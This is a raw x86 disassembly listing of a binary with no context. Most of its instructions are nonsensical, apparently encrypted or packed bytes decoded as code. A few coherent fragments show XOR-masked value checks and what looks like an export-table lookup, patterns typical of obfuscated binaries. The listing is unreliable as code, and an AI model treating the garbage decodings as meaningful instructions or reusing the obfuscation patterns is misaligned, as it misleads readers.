  41a658:	xor    eax,0x7510850
  41a65d:	add    eax,ebx
  41a65f:	cmp    ecx,eax
  41a661:	jne    0x41a8b9
  41a667:	mov    eax,DWORD PTR [ebp-0x20]
  41a66a:	inc    edi
  41a66b:	cmp    edi,eax
  41a66d:	jb     0x419d40
  41a673:	jmp    0x41a8c9
  41a678:	mov    eax,DWORD PTR [ebp-0x4]
  41a67b:	xor    eax,esi
  41a67d:	jmp    0x41a8b2
  41a682:	retf   0xccc3
  41a685:	cmp    al,0xd9
  41a687:	rcr    edx,cl
  41a689:	leave  
  41a68a:	mov    esp,gs
  41a68c:	and    al,0x1
  41a68e:	fwait
  41a68f:	push   0xd7b0a76a
  41a694:	jg     0x41a70e
  41a696:	adc    BYTE PTR [esi+0x78],bh
  41a699:	js     0x41a6b2
  41a69b:	psrld  mm7,QWORD PTR [edi-0x8cf91f3]
  41a6a2:	sub    esp,edx
  41a6a4:	pop    esi
  41a6a5:	cmp    al,BYTE PTR [ecx+0x6850bdc6]
  41a6ab:	repz js 0x41a6dc
  41a6ae:	sar    BYTE PTR [ecx+0xe],cl
  41a6b1:	add    al,0x78
  41a6b3:	sub    eax,0x686c078a
  41a6b8:	jg     0x41a6c4
  41a6ba:	sbb    esp,DWORD PTR [eax+0x4d]
  41a6bd:	push   esi
  41a6be:	push   esi
  41a6bf:	fst    DWORD PTR [eax-0x3a]
  41a6c2:	and    al,0x76
  41a6c4:	arpl   bp,si
  41a6c6:	popa   
  41a6c7:	sub    eax,0x30271f4e
  41a6cc:	adc    ebx,ebx
  41a6ce:	jle    0x41a731
  41a6d0:	mov    al,BYTE PTR [eax+0x77]
  41a6d3:	fndisi(8087 only) 
  41a6d5:	rcl    DWORD PTR [ecx],1
  41a6d7:	xlat   BYTE PTR ds:[ebx]
  41a6d8:	mov    dl,0xfc
  41a6da:	fs out dx,al
  41a6dc:	jb     0x41a719
  41a6de:	or     bl,ah
  41a6e0:	out    0x12,eax
  41a6e2:	mov    ecx,0x7f35fa80
  41a6e7:	sti    
  41a6e8:	and    eax,0x5fa30b70
  41a6ed:	lds    esi,FWORD PTR [eax-0x21]
  41a6f0:	cld    
  41a6f1:	jae    0x41a6c7
  41a6f3:	stos   BYTE PTR es:[edi],al
  41a6f4:	pop    es
  41a6f5:	xor    ah,BYTE PTR [eax-0x7f]
  41a6f8:	mov    DWORD PTR [ebp-0x47cd4741],ebx
  41a6fe:	pop    ebx
  41a6ff:	out    0xfd,eax
  41a701:	mov    eax,0x1f8e20d3
  41a706:	inc    ecx
  41a707:	mov    eax,0xdee5f3dd
  41a70c:	les    esi,FWORD PTR [ebp+0x1f]
  41a70f:	int    0xa7
  41a711:	xchg   esi,eax
  41a712:	adc    esp,DWORD PTR [edi]
  41a714:	rcr    DWORD PTR ds:0xe08f1cc8,0xab
  41a71b:	dec    esp
  41a71c:	(bad)  
  41a71d:	mov    ch,0x88
  41a71f:	jle    0x41a72b
  41a721:	push   ds
  41a722:	mov    bh,0xd0
  41a724:	in     eax,0xe2
  41a726:	dec    edx
  41a727:	mov    ah,0xf3
  41a729:	pop    ebp
  41a72a:	mov    dh,0xe9
  41a72c:	lahf   
  41a72d:	jno    0x41a785
  41a72f:	pop    edx
  41a730:	fs aad 0x19
  41a733:	rcl    BYTE PTR [edi],1
  41a735:	fdivr  QWORD PTR [ebx+ebx*2]
  41a738:	mov    ecx,0x2489cdc2
  41a73d:	jmp    0xa7aca9c4
  41a742:	stos   BYTE PTR es:[edi],al
  41a743:	jl     0x41a745
  41a745:	jmp    0x7a1333f9
  41a74a:	sbb    al,0xda
  41a74c:	iret   
  41a74d:	push   0x48
  41a74f:	nop
  41a750:	pop    ebp
  41a751:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a752:	test   BYTE PTR [eax-0x5e],dh
  41a755:	outs   dx,DWORD PTR ds:[esi]
  41a756:	pop    ecx
  41a757:	jne    0x41a719
  41a759:	loope  0x41a773
  41a75b:	lock sbb eax,0x3ac06e3
  41a761:	pop    es
  41a762:	sti    
  41a763:	dec    esp
  41a764:	in     eax,0x84
  41a766:	mov    bl,ah
  41a768:	mov    ebp,0x3c7b9c93
  41a76d:	push   ecx
  41a76e:	sbb    eax,0x5151bc6f
  41a773:	retf   
  41a774:	add    al,0xab
  41a776:	scas   al,BYTE PTR es:[edi]
  41a777:	dec    ebp
  41a778:	dec    esp
  41a779:	scas   al,BYTE PTR es:[edi]
  41a77a:	push   eax
  41a77b:	pop    es
  41a77c:	push   es
  41a77d:	icebp  
  41a77e:	lds    edx,FWORD PTR [ebp-0x35]
  41a781:	adc    DWORD PTR [ebx],ecx
  41a783:	lahf   
  41a784:	dec    eax
  41a785:	push   0x2e882f3f
  41a78a:	(bad)  
  41a78b:	jmp    0xd40e:0x32f879b3
  41a792:	gs nop
  41a794:	enter  0x4202,0x87
  41a798:	sbb    ebp,DWORD PTR [eax-0x1c]
  41a79b:	or     dh,bh
  41a79d:	adc    BYTE PTR [ebx+ebx*1+0x3a364430],ch
  41a7a4:	sub    bl,BYTE PTR [edi]
  41a7a6:	js     0x41a73b
  41a7a8:	sti    
  41a7a9:	push   edx
  41a7aa:	push   ds
  41a7ab:	inc    edx
  41a7ac:	pop    edi
  41a7ad:	cmp    DWORD PTR [ebx+edi*4+0x273d2d95],ebx
  41a7b4:	js     0x41a7cb
  41a7b6:	arpl   WORD PTR [ebx-0x279ff22c],di
  41a7bc:	and    BYTE PTR [ebp+eax*4-0x6a],dl
  41a7c0:	jb     0x41a7de
  41a7c2:	xor    al,0x62
  41a7c4:	in     eax,dx
  41a7c5:	sbb    BYTE PTR [edi+edx*8-0x49],cl
  41a7c9:	xchg   ebx,eax
  41a7ca:	cmp    ecx,ebx
  41a7cc:	mov    eax,ds:0x75946a97
  41a7d1:	stos   DWORD PTR es:[edi],eax
  41a7d2:	xchg   DWORD PTR ds:0xa27e62b0,edx
  41a7d8:	xchg   ecx,eax
  41a7d9:	ins    DWORD PTR es:[edi],dx
  41a7da:	or     al,0x86
  41a7dc:	sbb    dh,bh
  41a7de:	call   0xfd844d90
  41a7e3:	ins    DWORD PTR es:[edi],dx
  41a7e4:	sub    al,0x30
  41a7e6:	mov    bl,0x9c
  41a7e8:	cmp    eax,0xef3126ac
  41a7ed:	daa    
  41a7ee:	mov    dl,0xd8
  41a7f0:	in     eax,dx
  41a7f1:	adc    esp,DWORD PTR [eax-0x7a]
  41a7f4:	push   ebx
  41a7f5:	mov    ah,0x85
  41a7f7:	shr    BYTE PTR [ecx],0xc6
  41a7fa:	push   fs
  41a7fc:	dec    ecx
  41a7fd:	stos   DWORD PTR es:[edi],eax
  41a7fe:	jp     0x41a7cd
  41a800:	ret    0x7751
  41a803:	stc    
  41a804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a805:	adc    DWORD PTR [edi-0x103c78ce],ecx
  41a80b:	je     0x41a848
  41a80d:	lods   eax,DWORD PTR ds:[esi]
  41a80e:	sbb    bh,ah
  41a810:	push   ds
  41a811:	mov    DWORD PTR [ebp-0x4b0b8468],0x23073940
  41a81b:	cdq    
  41a81c:	pop    eax
  41a81d:	mov    dh,0x88
  41a81f:	ins    DWORD PTR es:[edi],dx
  41a820:	loope  0x41a7f2
  41a822:	dec    esi
  41a823:	mov    edx,0xce7314d0
  41a828:	dec    edx
  41a829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a82a:	xor    al,0x52
  41a82c:	ret    
  41a82d:	dec    esp
  41a82e:	pop    ebp
  41a82f:	pushf  
  41a830:	sub    esi,DWORD PTR [eax]
  41a832:	xchg   edx,eax
  41a833:	(bad)  
  41a834:	scas   al,BYTE PTR es:[edi]
  41a835:	cmp    BYTE PTR [ebp+0xd],dh
  41a838:	(bad)  
  41a83a:	imul   esi,esi,0x54
  41a83d:	mov    DWORD PTR [esp+edx*2-0x2c],edx
  41a841:	(bad)  
  41a842:	ja     0x41a88d
  41a844:	fwait
  41a845:	lock inc edi
  41a847:	xor    BYTE PTR gs:[edx+ebx*2+0x47],cl
  41a84c:	pop    esp
  41a84d:	ds adc dl,bl
  41a850:	sti    
  41a851:	pop    ecx
  41a852:	pop    edx
  41a853:	and    DWORD PTR [eax],esp
  41a855:	adc    dh,BYTE PTR [ebx-0x3e70596a]
  41a85b:	pop    DWORD PTR [edi+edi*8]
  41a85e:	pop    es
  41a85f:	sub    eax,0x4096ce1e
  41a864:	je     0x41a809
  41a866:	(bad)  
  41a867:	aaa    
  41a868:	aas    
  41a869:	mov    esp,0xabc4a814
  41a86e:	push   edx
  41a86f:	addr16 jmp 0x17ff:0x69e8d954
  41a877:	iret   
  41a878:	data16 sub ch,bl
  41a87b:	mov    WORD PTR [ebp+0x48],es
  41a87e:	fst    DWORD PTR [edx+0x19]
  41a881:	shl    eax,cl
  41a883:	sub    edx,esi
  41a885:	sub    al,0x20
  41a887:	push   0x51991457
  41a88c:	mov    al,0x8
  41a88e:	xchg   edx,eax
  41a890:	xchg   BYTE PTR [eax-0x568f31f3],bl
  41a896:	inc    esp
  41a897:	cwde   
  41a898:	lds    esi,FWORD PTR [esi+0x11]
  41a89b:	and    DWORD PTR [edi],ebx
  41a89d:	icebp  
  41a89e:	mov    ecx,0x9957c63e
  41a8a3:	rcl    BYTE PTR [eax+edi*1+0x7f995ad7],1
  41a8aa:	inc    esi
  41a8ab:	jp     0x41a8e0
  41a8ad:	adc    cl,BYTE PTR [ebp-0x24]
  41a8b0:	fwait
  41a8b1:	cwde   
  41a8b2:	add    eax,ebx
  41a8b4:	jmp    0x41c8fd
  41a8b9:	mov    eax,DWORD PTR [ebp-0x2c]
  41a8bc:	movzx  eax,WORD PTR [eax+edi*2]
  41a8c0:	mov    ecx,DWORD PTR [ebp-0x14]
  41a8c3:	mov    eax,DWORD PTR [ecx+eax*4]
  41a8c6:	mov    DWORD PTR [ebp+0xc],eax
  41a8c9:	mov    eax,DWORD PTR [ebp-0x4]
  41a8cc:	mov    ecx,DWORD PTR [ebp-0x8]
  41a8cf:	xor    eax,0x7510850
  41a8d4:	add    eax,ebx
  41a8d6:	cmp    ecx,eax
  41a8d8:	jne    0x41a8eb
  41a8de:	mov    eax,DWORD PTR [ebp-0x4]
  41a8e1:	xor    eax,0x7510850
  41a8e6:	jmp    0x41a8b2
  41a8eb:	mov    eax,DWORD PTR [ebp+0xc]
  41a8ee:	add    eax,DWORD PTR [ebp+0x8]
  41a8f1:	mov    DWORD PTR [ebp-0x10],eax
  41a8f4:	mov    eax,DWORD PTR [ebp-0x1c]
  41a8f7:	test   eax,eax
  41a8f9:	je     0x41bfdb
  41a8ff:	mov    DWORD PTR [ebp-0x24],esi
  41a902:	push   0xb
  41a904:	jmp    0x41ab39
  41a909:	rcl    dh,1
  41a90b:	xlat   BYTE PTR ds:[ebx]
  41a90c:	int3   
  41a90d:	aad    0xd1
  41a90f:	fcmovnu st,st(2)
  41a911:	ss (bad) 
  41a913:	inc    esp
  41a914:	sub    eax,0x66
  41a917:	fistp  QWORD PTR [edx+0x48]
  41a91a:	aad    0x7f
  41a91c:	js     0x41a92e
  41a91e:	jle    0x41a998
  41a920:	js     0x41a8b8
  41a922:	xchg   ebp,eax
  41a923:	rol    ebp,0x34
  41a926:	jnp    0x41a98b
  41a928:	mov    bh,0xe
  41a92a:	inc    edi
  41a92b:	js     0x41a8ae
  41a92d:	mov    bl,0xfe
  41a92f:	fld    QWORD PTR [esp+edi*1-0x6b]
  41a933:	imul   esi,eax,0x3e
  41a936:	ds out dx,al
  41a938:	ja     0x41a991
  41a93a:	ja     0x86665767
  41a940:	jns    0x41a98c
  41a942:	adc    eax,0xf2fd64c3
  41a947:	shr    DWORD PTR [ebx],0x39
  41a94a:	mov    al,ds:0xf5b8ec49
  41a94f:	xchg   edi,eax
  41a950:	retf   0xbb2b
  41a953:	xor    esp,ebp
  41a955:	pop    ss
  41a956:	iret   
  41a957:	adc    eax,0x6d10bebb
  41a95c:	xor    BYTE PTR [edi],ah
  41a95e:	cwde   
  41a95f:	jnp    0x41a903
  41a961:	xor    BYTE PTR [eax-0x55],bl
  41a964:	addr16 mov cl,0xe7
  41a967:	mov    ecx,0x749ec26d
  41a96c:	jns    0x41a99f
  41a96e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a96f:	lods   eax,DWORD PTR ds:[esi]
  41a970:	mov    bh,0x4b
  41a972:	popf   
  41a973:	iret   
  41a974:	inc    edx
  41a975:	push   cs
  41a976:	test   al,0x94
  41a978:	popa   
  41a979:	retf   
  41a97a:	push   es
  41a97b:	(bad)  
  41a97c:	push   eax
  41a97d:	push   esi
  41a97e:	enter  0x892c,0x6e
  41a982:	dec    eax
  41a983:	xlat   BYTE PTR ds:[ebx]
  41a984:	push   esp
  41a985:	dec    ecx
  41a986:	retf   0xaa4c
  41a989:	xor    DWORD PTR [edx-0x49de23db],ebx
  41a98f:	xor    ebx,DWORD PTR [esi]
  41a991:	cdq    
  41a992:	xchg   BYTE PTR [ebx],cl
  41a994:	xor    al,0xe9
  41a996:	test   eax,0x10dd3076
  41a99b:	scas   eax,DWORD PTR es:[edi]
  41a99c:	xchg   esi,eax
  41a99d:	cmp    ebp,esp
  41a99f:	sub    eax,0x52e8ad63
  41a9a4:	data16 adc BYTE PTR [eiz*2+0x48ac2e4c],dl
  41a9ac:	int3   
  41a9ad:	mov    eax,ds:0xd723c930
  41a9b2:	cli    
  41a9b3:	mov    ebx,0x29ad74d9
  41a9b8:	ret    
  41a9b9:	sbb    edx,DWORD PTR [ebx-0x80]
  41a9bc:	mov    dh,0x8c
  41a9be:	das    
  41a9bf:	cdq    
  41a9c0:	jb     0x41a977
  41a9c2:	pop    ss
  41a9c3:	test   edi,ebp
  41a9c5:	(bad)  
  41a9c6:	cmp    bh,ah
  41a9c8:	inc    ecx
  41a9c9:	xchg   ebp,eax
  41a9ca:	(bad)  
  41a9cb:	sbb    al,0x95
  41a9cd:	in     eax,0x93
  41a9cf:	nop
  41a9d0:	aas    
  41a9d1:	and    al,0x6f
  41a9d3:	cli    
  41a9d4:	jb     0x41a97e
  41a9d6:	in     al,0x39
  41a9d8:	jae    0x41aa26
  41a9da:	mov    ebx,0x27a3db10
  41a9df:	ss jl  0x41a9fb
  41a9e2:	push   edx
  41a9e3:	sbb    DWORD PTR [edi-0xec6fde],edx
  41a9e9:	mov    al,0xee
  41a9eb:	pop    ds
  41a9ec:	stos   BYTE PTR es:[edi],al
  41a9ed:	cld    
  41a9ee:	jge    0x41a9f1
  41a9f0:	loopne 0x41aa48
  41a9f2:	sub    BYTE PTR [ebx],bl
  41a9f4:	cdq    
  41a9f5:	je     0x41aa63
  41a9f7:	fcmovb st,st(4)
  41a9f9:	add    eax,DWORD PTR [edi]
  41a9fb:	in     eax,dx
  41a9fc:	sbb    ebp,ebx
  41a9fe:	shr    BYTE PTR [esp+esi*1+0x1b],0x86
  41aa03:	cmp    edi,DWORD PTR [edi-0xe]
  41aa06:	mov    ds:0x77c17435,eax
  41aa0b:	lods   eax,DWORD PTR ds:[esi]
  41aa0c:	pop    ecx
  41aa0d:	repz mov eax,ds:0xdff90157
  41aa13:	fcom   QWORD PTR [esi-0x51]
  41aa16:	ret    0xe074
  41aa19:	call   0x1bd9:0x1b48c5db
  41aa20:	adc    al,0x82
  41aa22:	push   esp
  41aa23:	mov    ds,WORD PTR [eax+0x25]
  41aa26:	mov    ds:0xedca0094,eax
  41aa2b:	jne    0x41aaa3
  41aa2d:	xor    bh,dl
  41aa2f:	hlt    
  41aa30:	cmp    dh,0x8a
  41aa33:	clc    
  41aa34:	and    eax,0x1a11c1b
  41aa39:	sbb    DWORD PTR [ecx],edx
  41aa3b:	popf   
  41aa3c:	andnps xmm4,XMMWORD PTR [eax]
  41aa3f:	in     eax,dx
  41aa40:	or     al,0x37
  41aa42:	hlt    
  41aa43:	jb     0x41aa63
  41aa45:	scas   eax,DWORD PTR es:[edi]
  41aa46:	mov    bh,al
  41aa48:	push   ebx
  41aa49:	adc    esi,ebx
  41aa4b:	ds push ds
  41aa4d:	cmp    DWORD PTR [ebp+0x7],edx
  41aa50:	test   eax,0x1c735ad8
  41aa55:	mov    esi,0x4b17abbc
  41aa5a:	(bad)  
  41aa5b:	repnz stc 
  41aa5d:	shl    DWORD PTR [ecx+0x41],cl
  41aa60:	pop    edx
  41aa61:	cmp    DWORD PTR [edx-0x5307b22],0x1ee24b76
  41aa6b:	pop    ebx
  41aa6c:	fstp   st(3)
  41aa6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa6f:	mov    DWORD PTR [ebx+0x6a903471],esi
  41aa75:	push   ds
  41aa76:	push   ss
  41aa77:	inc    edi
  41aa78:	mov    ch,BYTE PTR [edi]
  41aa7a:	out    0xd3,al
  41aa7c:	xchg   edx,eax
  41aa7d:	lds    eax,FWORD PTR [edi+ecx*4+0x2f339f23]
  41aa84:	stc    
  41aa85:	mov    ah,0xc7
  41aa87:	xor    DWORD PTR [ebx-0x80],edi
  41aa8a:	out    dx,al
  41aa8b:	sub    dh,ch
  41aa8d:	inc    ebp
  41aa8e:	into   
  41aa8f:	sbb    eax,0xc037aa29
  41aa94:	push   ecx
  41aa95:	dec    esp
  41aa96:	inc    eax
  41aa97:	cs stc 
  41aa99:	cmp    ch,dl
  41aa9b:	ss pop edi
  41aa9d:	test   DWORD PTR [ebx-0xb],edx
  41aaa0:	test   DWORD PTR [ebp+0xb],esi
  41aaa3:	sahf   
  41aaa4:	sub    al,0xa3
  41aaa6:	addr16 adc ebp,edx
  41aaa9:	pop    edi
  41aaaa:	dec    ebp
  41aaab:	stos   DWORD PTR es:[edi],eax
  41aaac:	adc    DWORD PTR [ebp+ebx*1-0x4f],0x5a
  41aab1:	jno    0x41aac3
  41aab3:	in     al,0x62
  41aab5:	int3   
  41aab6:	fstp   QWORD PTR [eax+edx*4+0x1d802d34]
  41aabd:	out    dx,al
  41aabe:	int    0xf5
  41aac0:	mov    ss,WORD PTR [edi]
  41aac2:	imul   esp,esi,0x1b
  41aac5:	adc    ah,bh
  41aac7:	into   
  41aac8:	sti    
  41aac9:	and    ebp,DWORD PTR [edx+0x4997d715]
  41aacf:	stc    
  41aad0:	push   ds
  41aad1:	sub    esi,DWORD PTR [esi+ecx*4]
  41aad4:	mov    esi,0x8ccf02d4
  41aad9:	out    dx,eax
  41aada:	inc    ebx
  41aadb:	push   es
  41aadc:	out    0xc9,al
  41aade:	mov    dh,0xea
  41aae0:	lock hlt 
  41aae2:	xchg   ebp,eax
  41aae3:	sbb    ch,ch
  41aae5:	sbb    al,0xd0
  41aae7:	jb     0x41aa6d
  41aae9:	(bad)  
  41aaea:	jmp    0xe04f:0x42b76d29
  41aaf1:	pop    edx
  41aaf2:	xor    eax,0xd0caf726
  41aaf7:	dec    ebx
  41aaf8:	mov    ebp,0xc207427c
  41aafd:	(bad)  
  41aafe:	adc    esp,ebp
  41ab00:	mov    ds:0x4d241784,al
  41ab05:	loop   0x41ab7a
  41ab07:	mov    eax,0x7e915c29
  41ab0c:	cmp    ebp,esp
  41ab0e:	imul   edi,DWORD PTR [eax-0x74],0x83fdfbd6
  41ab15:	popa   
  41ab16:	and    bl,ch
  41ab18:	inc    esp
  41ab19:	lods   al,BYTE PTR ds:[esi]
  41ab1a:	aas    
  41ab1b:	lock in al,dx
  41ab1d:	mov    ebp,0xf81126eb
  41ab22:	sub    al,0x2d
  41ab24:	mov    eax,0xa159accf
  41ab29:	les    ecx,FWORD PTR [esi-0x2de33dbb]
  41ab2f:	cwde   
  41ab30:	aas    
  41ab31:	mov    ebp,0xaa0efbe7
  41ab36:	inc    esp
  41ab37:	xchg   ecx,eax
  41ab38:	or     ebx,DWORD PTR [ecx+0x6a]
  41ab3b:	add    eax,0x30e95b49
  41ab40:	add    al,BYTE PTR [eax]
  41ab42:	add    dl,dl
  41ab44:	sar    DWORD PTR [edi],cl
  41ab46:	leave  
  41ab47:	cmp    eax,0x48dbdad9
  41ab4c:	pushf  
  41ab4d:	mov    eax,ds:0x64f2aabe
  41ab52:	test   al,0x60
  41ab54:	fstp   TBYTE PTR [edi+0x78]
  41ab57:	adc    BYTE PTR [esi+0x78],bh
  41ab5a:	js     0x41ab07
  41ab5c:	xchg   esp,eax
  41ab5d:	mov    ds:0x96e4bd07,al
  41ab62:	ss mov ah,0x54
  41ab65:	fcmovne st,st(7)
  41ab67:	call   0x23accc55
  41ab6c:	inc    ebx
  41ab6d:	cmp    al,0x55
  41ab6f:	lods   eax,DWORD PTR ds:[esi]
  41ab70:	hlt    
  41ab71:	call   0x21d2:0xa052bcc0
  41ab78:	mov    ebx,0xf93ff3ba
  41ab7d:	jbe    0x41abbc
  41ab7f:	imul   esi,DWORD PTR [ebp+0x11],0xb9a1e44e
  41ab86:	fsubr  st(6),st
  41ab88:	mov    ebx,0x3a6462ef
  41ab8d:	mov    eax,ds:0xa0c05492
  41ab92:	shl    DWORD PTR es:[esi+ecx*4-0x483ebb32],cl
  41ab9a:	jle    0x41ab22
  41ab9c:	xchg   ebp,eax
  41ab9d:	jmp    0x4dcd8657
  41aba2:	mov    esi,DWORD PTR [ecx]
  41aba4:	into   
  41aba5:	sub    BYTE PTR [ebx],ah
  41aba7:	test   DWORD PTR [esi+edx*2-0x3e4daa29],0x8fba2024
  41abb2:	dec    ebx
  41abb3:	mov    edx,0x4f920251
  41abb8:	add    bh,BYTE PTR [ebp+0x51]
  41abbb:	xor    dl,BYTE PTR [ebx-0x6e]
  41abbe:	rcr    DWORD PTR [edx-0x3f5ee126],1
  41abc4:	xchg   ebp,eax
  41abc5:	mov    al,ds:0xb0c1726b
  41abca:	pushf  
  41abcb:	add    DWORD PTR [ebx],edi
  41abcd:	sbb    al,0x3
  41abcf:	call   0x40d3:0x3bf75148
  41abd6:	(bad)  
  41abd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abd9:	out    0x49,al
  41abdb:	test   al,0x80
  41abdd:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41abdf:	dec    edi
  41abe0:	mov    edi,0xabfc482f
  41abe5:	xchg   BYTE PTR [edi],al
  41abe7:	dec    esp
  41abe8:	dec    edi
  41abe9:	xchg   edx,eax
  41abea:	les    esi,FWORD PTR [edi+0x2969a709]
  41abf0:	(bad)  
  41abf1:	cli    
  41abf2:	inc    esp
  41abf3:	and    al,0x27
  41abf5:	cmp    BYTE PTR [ebp-0x77a6f1a0],0x9b
  41abfc:	inc    edx
  41abfd:	or     bh,BYTE PTR [ecx+edx*4-0xaea52bc]
  41ac04:	mul    BYTE PTR [ebx+0x13]
  41ac07:	mov    al,0x95
  41ac09:	es jno 0x41abb3
  41ac0c:	test   BYTE PTR [edx+ebx*8+0xb8f9917],0x8c
  41ac14:	cld    
  41ac15:	sbb    eax,0x60a24816
  41ac1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac1b:	outs   dx,DWORD PTR ds:[esi]
  41ac1c:	adc    eax,eax
  41ac1e:	in     al,0x66
  41ac20:	fwait
  41ac21:	jge    0x41ac3e
  41ac23:	das    
  41ac24:	out    dx,eax
  41ac25:	das    
  41ac26:	add    eax,DWORD PTR [edx+0x5f3d489e]
  41ac2c:	(bad)  
  41ac2d:	cmp    al,BYTE PTR [edx]
  41ac2f:	vshufps xmm1,xmm6,XMMWORD PTR [esi+0x52],0x7e
  41ac35:	mov    BYTE PTR [ecx+edi*4-0x33ed55fa],cl
  41ac3c:	sub    DWORD PTR [esi+0x7f6259b6],0x38
  41ac43:	enter  0x1049,0x75
  41ac47:	lock and BYTE PTR [ecx-0x16ae1571],ch
  41ac4e:	sbb    ecx,DWORD PTR cs:[eax]
  41ac51:	pop    edx
  41ac52:	popa   
  41ac53:	mov    ds:0xce19c81d,eax
  41ac58:	std    
  41ac59:	sbb    eax,0x2f923011
  41ac5e:	push   0x61
  41ac60:	(bad)  
  41ac61:	scas   eax,DWORD PTR es:[edi]
  41ac62:	call   DWORD PTR [esi]
  41ac64:	dec    esi
  41ac65:	pusha  
  41ac66:	out    0xa1,eax
  41ac68:	(bad)  
  41ac69:	(bad)  
  41ac6b:	dec    ecx
  41ac6c:	mov    ch,0x25
  41ac6e:	mov    cl,0x14
  41ac70:	daa    
  41ac71:	pop    ds
  41ac72:	or     dl,dl
  41ac74:	dec    ebp
  41ac75:	int    0x3e
  41ac77:	rol    bh,1
  41ac79:	add    BYTE PTR [ecx],al
  41ac7b:	lock xor dl,BYTE PTR [esi-0x5f]
  41ac7f:	sub    esp,DWORD PTR [eax-0x27]
  41ac82:	icebp  
  41ac83:	mov    dh,ah
  41ac85:	repz mov eax,ds:0xd3b04e92
  41ac8b:	ja     0x41ac1f
  41ac8d:	stc    
  41ac8e:	or     BYTE PTR ds:0x41080d16,bh
  41ac94:	and    DWORD PTR [esi+edx*8],ebx
  41ac97:	cli    
  41ac98:	mov    esp,0x81094b5c
  41ac9d:	js     0x41acf4
  41ac9f:	jbe    0x41ac4b
  41aca1:	xchg   ebx,eax
  41aca2:	mov    ah,0xb3
  41aca4:	call   0x6ec7ddb9
  41aca9:	(bad)  
  41acaa:	sub    ebx,DWORD PTR [eax+eiz*1+0x44315009]
  41acb1:	mov    esp,0xbbbdd15c
  41acb6:	test   al,0x80
  41acb8:	call   0xb185:0xafe19360
  41acbf:	push   es
  41acc0:	push   es
  41acc1:	push   cs
  41acc2:	push   ebp
  41acc3:	stc    
  41acc4:	pop    edx
  41acc5:	mov    edi,ebx
  41acc7:	xchg   ebx,eax
  41acc8:	push   ss
  41acc9:	pop    ecx
  41acca:	dec    edi
  41accb:	jns    0x41acf3
  41accd:	xchg   ebx,eax
  41acce:	out    dx,al
  41accf:	mov    cs,WORD PTR ds:0xf8700517
  41acd5:	and    eax,0xba3b50a9
  41acda:	adc    ebp,ebp
  41acdc:	cmp    bh,BYTE PTR [edi-0xb4b1809]
  41ace2:	or     ecx,DWORD PTR [esp+edx*4+0x27d51f32]
  41ace9:	aad    0xc3
  41aceb:	loopne 0x41acc7
  41aced:	sbb    eax,0x341a54fd
  41acf2:	sar    BYTE PTR [ebx],1
  41acf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acf5:	xor    BYTE PTR ds:0x9dae8769,0xf1
  41acfc:	call   0x89c1:0xe3ce8bf4
  41ad03:	(bad)  
  41ad04:	aam    0xb
  41ad06:	addr16 inc ebx
  41ad08:	inc    ebx
  41ad09:	add    al,0xc8
  41ad0b:	leave  
  41ad0c:	mov    al,ds:0x1fdfa385
  41ad11:	dec    ecx
  41ad12:	addr16 out dx,al
  41ad14:	or     BYTE PTR [ecx],dl
  41ad16:	sbb    cl,dl
  41ad18:	int3   
  41ad19:	std    
  41ad1a:	cwde   
  41ad1b:	push   esp
  41ad1c:	cs ins BYTE PTR es:[edi],dx
  41ad1e:	dec    esi
  41ad1f:	dec    ebx
  41ad20:	push   0xffffff9e
  41ad22:	fstp   TBYTE PTR [edi-0x4a1918a0]
  41ad28:	out    dx,al
  41ad29:	adc    ah,BYTE PTR [esi]
  41ad2b:	push   0xffffffce
  41ad2d:	mov    esp,0x3be531f5
  41ad32:	iret   
  41ad33:	dec    ebx
  41ad34:	and    esi,0x9f9de96b
  41ad3a:	inc    eax
  41ad3b:	cmp    al,0xc5
  41ad3d:	xlat   BYTE PTR ds:[ebx]
  41ad3e:	jg     0x41ad67
  41ad40:	jecxz  0x41acdb
  41ad42:	mov    ecx,0xc790c6ca
  41ad47:	mov    dh,0x48
  41ad49:	retf   0xecbc
  41ad4c:	xchg   edx,eax
  41ad4d:	(bad)  
  41ad4f:	aam    0x64
  41ad51:	cmp    DWORD PTR [edi+eax*8+0x2dda4fde],ebp
  41ad58:	loope  0x41ad06
  41ad5a:	(bad)  
  41ad5b:	test   eax,0x94b5a858
  41ad60:	std    
  41ad61:	pop    esp
  41ad62:	sar    BYTE PTR [ebp-0x4a],0xdd
  41ad66:	push   ds
  41ad67:	jb     0x41adce
  41ad69:	fwait
  41ad6a:	lods   eax,DWORD PTR ds:[esi]
  41ad6b:	pop    ecx
  41ad6c:	push   edi
  41ad6d:	xchg   edx,eax
  41ad6e:	and    DWORD PTR [ecx-0x78c1acc7],ecx
  41ad74:	retf   
  41ad75:	sub    ebx,ecx
  41ad77:	jmp    0x41afac
  41ad7c:	ret    0xd1d7
  41ad7f:	aas    
  41ad80:	fxch   st(1)
  41ad82:	rcr    cl,cl
  41ad84:	mov    ds:0x54d25295,eax
  41ad89:	fld    TBYTE PTR [edi-0xb]
  41ad8c:	js     0x41ad66
  41ad8e:	jg     0x41ae08
  41ad90:	adc    BYTE PTR [esi+0x78],bh
  41ad93:	js     0x41ad3d
  41ad95:	cdq    
  41ad96:	mov    al,0xce
  41ad98:	retf   0xb978
  41ad9b:	xor    eax,0x4f54c51c
  41ada0:	dec    eax
  41ada1:	adc    BYTE PTR [esi],ah
  41ada3:	cmp    al,0x22
  41ada5:	inc    ecx
  41ada6:	xlat   BYTE PTR ds:[ebx]
  41ada7:	jno    0x41ad7d
  41ada9:	popa   
  41adaa:	fbstp  TBYTE PTR [ebx+0x1a80bf34]
  41adb0:	push   ecx
  41adb1:	jge    0x41adab
  41adb3:	popf   
  41adb4:	test   DWORD PTR [edi-0x6e],0x4aa46b69
  41adbb:	jb     0x41ad75
  41adbd:	push   esp
  41adbe:	fist   DWORD PTR [eax+0x3b]
  41adc1:	pop    esp
  41adc2:	cmp    al,0xc1
  41adc4:	sbb    eax,0xacd5a70b
  41adc9:	int    0x74
  41adcb:	mov    ds:0x520178b2,al
  41add0:	test   eax,0x9a5e4b1a
  41add5:	in     al,dx
  41add6:	das    
  41add7:	shl    DWORD PTR ds:[eax],1
